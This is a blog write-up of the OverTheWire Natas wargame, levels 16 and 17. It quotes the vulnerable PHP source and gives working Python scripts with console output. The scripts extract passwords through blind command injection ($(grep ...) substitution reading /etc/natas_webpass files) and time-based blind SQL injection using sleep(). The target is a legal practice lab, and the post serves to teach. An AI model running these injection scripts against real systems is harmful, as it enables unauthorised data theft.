---
layout: single
title: "OverTheWire: 'Natas' Solutions 16-20"
header:
  teaser: oth.png
  overlay_image: ZenBGG.png
  caption: "[__OverTheWire__](http://overthewire.org/wargames/)"
related: true
comments: true
---

Welcome back! This post is the continuation of the __Natas__ wargame from [OverTheWire](http://overthewire.org/wargames/natas/).

If you haven't already read my previous post from Solutions 1-10, then I highly suggest you do so before continuing on to the higher end levels, as the lower levels will provide you the basics of web hacking. You can read that post [here](https://jhalon.github.io/over-the-wire-natas1/)!

Afterwards you can read my post on Solution 11-15, which are mandatory in understanding these next few levels. You can read that post [here](https://jhalon.github.io/over-the-wire-natas2/)!

So, let us begin!

### Level 16:
<a href="/images/natas16.PNG"><img src="/images/natas16.PNG"></a>

This level is actually similar to level 9 and 10 of natas. Though this time, there is more filtering being done, so we might have a tough time to inject code. Let's check the source code and see what we have.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Great... this might be a little though. They aren't only filtering characters needed to inject a command, they are also [escaping](http://www.hackingwithphp.com/2/6/2/escape-sequences) quote characters for __$key__. This will turn any of our input into a string.

But I have noticed that they aren't filtering the __$__ and __( )__ characters. So we might be able to inject another command into the string using [command substitution](http://wiki.bash-hackers.org/syntax/expansion/cmdsubst). 

I attempted to inject __$(grep a /etc/natas_webpass/natas17)__, I noticed that all of the dictionary words were returned. The command that I ran, looked something like this within the php code.

`passthru("grep -i \"$(grep a /etc/natas_webpass/natas17)\" dictionary.txt");`

Because all words were returned, I knew the command I injected - to __grep a__ in natas17 - was false. When I tried injecting __$(grep A /etc/natas_webpass/natas17)__, nothing was returned. This made me believe that if nothing was returned, then my command was valid and the letter A, existed in natas17's password.

So what we have to do from here is similar to 16. We need to take our python code, edit it, and try to brute force the password. I used the word __Fridays__ at the end of my command - __$(grep a /etc/natas_webpass/natas17)Fridays__ - so in case the command failed, __Fridays__ would return in the output and my script could pick up on that as __False__.

So let's go head and edit our __brute.py__ script like so:

```python
#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh*@natas16.natas.labs.overthewire.org/'
trueStr = 'Output:\n<pre>\n</pre>'

for x in chars:
        r = requests.get(target+'?needle=$(grep '+x+' /etc/natas_webpass/natas17)Fridays')
        if r.content.find(trueStr) != -1:
                exist += x
                print 'Using: ' + exist

print 'All characters used. Starting brute force... Grab a coffee, might take a while!'

for i in range(32):
        for c in exist:
                r = requests.get(target+'?needle=$(grep ^'+password+c+' /etc/natas_webpass/natas17)Fridays')
                if r.content.find(trueStr) != -1:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break
                        
print 'Completed!'
```

Once done, let's go ahead and run it!

```console
root@kali:~# chmod +x brute.py
root@kali:~# ./brute.py
Used chars: 0
Used chars: 03
Used chars: 035
Used chars: 0357
Used chars: 03578
Used chars: 035789
Used chars: 035789b
Used chars: 035789bc
Used chars: 035789bcd
Used chars: 035789bcdg
Used chars: 035789bcdgh
Used chars: 035789bcdghk
Used chars: 035789bcdghkm
Used chars: 035789bcdghkmn
Used chars: 035789bcdghkmnq
Used chars: 035789bcdghkmnqr
Used chars: 035789bcdghkmnqrs
Used chars: 035789bcdghkmnqrsw
Used chars: 035789bcdghkmnqrswA
Used chars: 035789bcdghkmnqrswAG
Used chars: 035789bcdghkmnqrswAGH
Used chars: 035789bcdghkmnqrswAGHN
Used chars: 035789bcdghkmnqrswAGHNP
Used chars: 035789bcdghkmnqrswAGHNPQ
Used chars: 035789bcdghkmnqrswAGHNPQS
Used chars: 035789bcdghkmnqrswAGHNPQSW
All characters used. Starting brute force... Grab a coffee, might take a while!
Password: 8*******************************
Password: 8P******************************
Password: 8Ps*****************************
Password: 8Ps3****************************
Password: 8Ps3H***************************
Password: 8Ps3H0**************************
Password: 8Ps3H0G*************************
Password: 8Ps3H0GW************************
Password: 8Ps3H0GWb***********************
Password: 8Ps3H0GWbn**********************
Password: 8Ps3H0GWbn5*********************
Password: 8Ps3H0GWbn5r********************
Password: 8Ps3H0GWbn5rd*******************
Password: 8Ps3H0GWbn5rd9******************
Password: 8Ps3H0GWbn5rd9S*****************
Password: 8Ps3H0GWbn5rd9S7****************
Password: 8Ps3H0GWbn5rd9S7G***************
Password: 8Ps3H0GWbn5rd9S7Gm**************
Password: 8Ps3H0GWbn5rd9S7GmA*************
Password: 8Ps3H0GWbn5rd9S7GmAd************
Password: 8Ps3H0GWbn5rd9S7GmAdg***********
Password: 8Ps3H0GWbn5rd9S7GmAdgQ**********
Password: 8Ps3H0GWbn5rd9S7GmAdgQN*********
Password: 8Ps3H0GWbn5rd9S7GmAdgQNd********
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdk*******
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkh******
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP*****
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk****
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq***
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9**
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c*
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
Completed!
```

And there we have it folks! We are done with level 16, and can move on to level 17!

### Level 17

Seems similar to 16... hmmm. Let's check out the source code and see what we have to work with.

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?> 
```

Well, look at that! It's the same a.... oh, wait a second... they commented out the echo responses, darn.

Okay, that's fine! At least we still know that there is a __username__ and __password__ field in the database, and that the query is susceptible to SQL Injection.

```python
#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'

r = requests.get(target)

for x in chars:
	try:
		r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "%' + x + '%", sleep(5), null) %23', timeout=1)
	except requests.exceptions.Timeout:
		exist += x
		print 'Using: ' + exist

print 'All characters used. Starting brute force... Grab a coffee, might take a while!'

for i in range(32):
	for c in exist:
		try:
			r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
		except requests.exceptions.Timeout:
			password += c
			print 'Password: ' + password + '*' * int(32 - len(password))
			break

print 'Completed!'
```

```console
root@kali:~# ./brute.py
Using: 0
Using: 04
Using: 047
Using: 047d
Using: 047dg
Using: 047dgh
Using: 047dghj
Using: 047dghjl
Using: 047dghjlm
Using: 047dghjlmp
Using: 047dghjlmpq
Using: 047dghjlmpqs
Using: 047dghjlmpqsv
Using: 047dghjlmpqsvw
Using: 047dghjlmpqsvwx
Using: 047dghjlmpqsvwxy
Using: 047dghjlmpqsvwxyC
Using: 047dghjlmpqsvwxyCD
Using: 047dghjlmpqsvwxyCDF
Using: 047dghjlmpqsvwxyCDFI
Using: 047dghjlmpqsvwxyCDFIK
Using: 047dghjlmpqsvwxyCDFIKO
Using: 047dghjlmpqsvwxyCDFIKOP
Using: 047dghjlmpqsvwxyCDFIKOPR
All characters used. Starting brute force... Grab a coffee, might take a while!
Password: x*******************************
Password: xv******************************
Password: xvK*****************************
Password: xvKI****************************
Password: xvKIq***************************
Password: xvKIqD**************************
Password: xvKIqDj*************************
Password: xvKIqDjy************************
Password: xvKIqDjy4***********************
Password: xvKIqDjy4O**********************
Password: xvKIqDjy4OP*********************
Password: xvKIqDjy4OPv********************
Password: xvKIqDjy4OPv7*******************
Password: xvKIqDjy4OPv7w******************
Password: xvKIqDjy4OPv7wC*****************
Password: xvKIqDjy4OPv7wCR****************
Password: xvKIqDjy4OPv7wCRg***************
Password: xvKIqDjy4OPv7wCRgD**************
Password: xvKIqDjy4OPv7wCRgDl*************
Password: xvKIqDjy4OPv7wCRgDlm************
Password: xvKIqDjy4OPv7wCRgDlmj***********
Password: xvKIqDjy4OPv7wCRgDlmj0**********
Password: xvKIqDjy4OPv7wCRgDlmj0p*********
Password: xvKIqDjy4OPv7wCRgDlmj0pF********
Password: xvKIqDjy4OPv7wCRgDlmj0pFs*******
Password: xvKIqDjy4OPv7wCRgDlmj0pFsC******
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCs*****
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsD****
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDj***
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh**
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd*
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
Completed!
```

